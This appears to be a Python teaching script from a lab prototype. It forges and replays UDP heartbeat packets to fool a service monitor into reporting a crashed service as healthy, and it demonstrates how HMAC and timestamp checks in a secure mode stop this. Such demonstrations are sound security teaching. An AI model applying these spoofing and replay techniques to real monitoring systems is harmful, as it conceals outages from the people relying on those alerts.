#!/usr/bin/env python3
"""
attacker.py - ADVERSARIAL AUDIT SCRIPT (for your own lab/class prototype on localhost only).

Attack 1 - spoof : send forged HEARTBEATs to the monitor so it keeps reporting "healthy"
                   after the real service is dead. The attacker knows only the (public)
                   wire format, NOT the HMAC secret.
Attack 2 - replay: take a genuine captured heartbeat (from the monitor's --wiretap file,
                   standing in for tcpdump/Wireshark) and re-send it repeatedly to mask a crash.

Typical demo:
    python3 monitor.py --wiretap capture.log            # terminal 1
    python3 service.py                                   # terminal 2 (wait for it to crash)
    python3 attacker.py spoof                            # terminal 3 -> monitor goes "green" again
    python3 attacker.py replay --capture capture.log     # terminal 3 -> same, via replay
Repeat with `--secure` on service and monitor (attacker needs no flag) to see the attacks fail.
"""
import argparse
import json
import random
import socket
import sys
import time
import uuid

import common


def spoof(sock, args):
    """Forge fresh-looking heartbeats. Without the HMAC secret the 'mac' field is a guess."""
    boot = uuid.uuid4().hex[:8]
    print(f"[attacker] SPOOF: forging heartbeats as '{common.SERVICE_NAME}' boot={boot}, "
          f"period={args.interval}s for {args.duration}s")
    end = time.time() + args.duration
    seq = random.randint(1, 1000)
    while time.time() < end:
        seq += 1
        msg = {"type": "HEARTBEAT", "svc": common.SERVICE_NAME, "boot": boot, "seq": seq,
               "ts": time.time(), "mac": "00" * 32}          # forged / guessed MAC
        sock.sendto(json.dumps(msg).encode(), common.MONITOR_ADDR)
        print(f"[attacker] sent forged heartbeat seq={seq}")
        time.sleep(args.interval)
    print("[attacker] spoof run finished. Check the monitor: did it stay HEALTHY (baseline) or log REJECTs (secure)?")


def replay(sock, args):
    """Replay a captured genuine heartbeat verbatim."""
    try:
        with open(args.capture) as f:
            lines = [l.strip() for l in f if l.strip()]
    except OSError as e:
        sys.exit(f"[attacker] cannot read capture file: {e}")
    packet = None
    for line in reversed(lines):                              # newest genuine-looking beat
        try:
            m = json.loads(line)
            # skip our own forged spoof packets (all-zero MAC) - we want a GENUINE capture
            if m.get("type") == "HEARTBEAT" and m.get("mac") != "00" * 32:
                packet = line
                break
        except json.JSONDecodeError:
            continue
    if not packet:
        sys.exit("[attacker] no heartbeat found in capture file (run the service first)")
    print(f"[attacker] REPLAY: captured packet = {packet}")
    if args.delay:
        print(f"[attacker] waiting {args.delay}s so the captured packet becomes stale ...")
        time.sleep(args.delay)
    end = time.time() + args.duration
    n = 0
    while time.time() < end:
        sock.sendto(packet.encode(), common.MONITOR_ADDR)     # byte-for-byte replay
        n += 1
        print(f"[attacker] replayed identical packet (#{n})")
        time.sleep(args.interval)
    print("[attacker] replay run finished.")


def main():
    ap = argparse.ArgumentParser(description="Heartbeat spoofing / replay audit tool")
    sub = ap.add_subparsers(dest="mode", required=True)
    for name in ("spoof", "replay"):
        p = sub.add_parser(name)
        p.add_argument("--interval", type=float, default=common.T_INTERVAL)
        p.add_argument("--duration", type=float, default=15.0)
        if name == "replay":
            p.add_argument("--capture", required=True, help="wiretap file written by monitor.py --wiretap")
            p.add_argument("--delay", type=float, default=3.0,
                           help="wait before replaying so the packet is stale (shows timestamp defence)")
    args = ap.parse_args()
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    {"spoof": spoof, "replay": replay}[args.mode](sock, args)


if __name__ == "__main__":
    main()
